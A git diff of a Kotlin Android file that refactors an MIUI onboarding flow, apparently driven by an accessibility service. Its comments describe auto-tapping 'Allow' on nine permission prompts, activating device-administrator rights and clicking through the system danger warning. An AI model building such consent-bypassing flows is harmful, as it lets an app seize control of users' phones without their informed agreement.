@@ -1,8 +1,6 @@
 package com.zaka.screenagent.flow
 
-import android.app.Activity
 import android.content.Intent
-import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
@@ -20,8 +18,8 @@ import com.zaka.screenagent.perm.PermissionFlow
  *
  *   start()
  *     ├─ step1_权限()        申请 9 项运行时权限，自动点「允许」
- *     ├─ step2_设备管理()    打开激活页 → 点「激活」→ 危险页（2s 勾选 / 10s 确定）
- *     └─ step3_收尾()        校验 isAdminActive → 结束（通知/电池暂不做）
+ *     ├─ step2_设备管理()    载体打开激活页 → 点一次「启用」→ 危险页（2s 勾选 / 10s 确定）
+ *     └─ step4_收尾()        打印 admin / 通知使用权结果 → 结束
  *
  * 每一步的具体实现都在本文件下方，不依赖其它厂商的任何代码。
  * 以后加步骤就在 start() 里插一行，其它文件不用动。
@@ -56,11 +54,13 @@ object MiuiFlow : VendorFlow {
             }
             step2_设备管理(service) { active ->
                 if (!STEP3_ENABLED) {
-                    Log.d(TAG, "step3: 已暂时关闭（先只验证前两步）")
-                    step4_收尾(active, false)
+                    Log.d(TAG, "step3: 已关闭（当前只做前两步）")
+                    Log.d(TAG, "结束：管理员=$active")
+                    Log.d(TAG, "===== MIUI 引导结束 =====")
                 } else {
                     step3_通知使用权(service) { granted ->
-                        step4_收尾(active, granted)
+                        Log.d(TAG, "结束：管理员=$active 通知使用权=$granted")
+                        Log.d(TAG, "===== MIUI 引导结束 =====")
                     }
                 }
             }
@@ -287,15 +287,4 @@ object MiuiFlow : VendorFlow {
             service.packageManager.getApplicationLabel(service.applicationInfo).toString()
         }.getOrDefault("love")
 
-    // ───────────────────────── 第 4 步：收尾 ─────────────────────────
-
-    private fun step4_收尾(adminActive: Boolean, notiGranted: Boolean) {
-        Log.d(TAG, "step4: 管理员=$adminActive 通知使用权=$notiGranted -> 结束（电池未接）")
-        Log.d(TAG, "===== MIUI 引导结束 =====")
-    }
 }
-
-/**
- * 小米专用的设备管理激活页载体（同文件，不单独建类文件）。
- * 前台 Activity 才能拉起系统激活页（MIUI 拦后台启动），所以必须有它。
- */
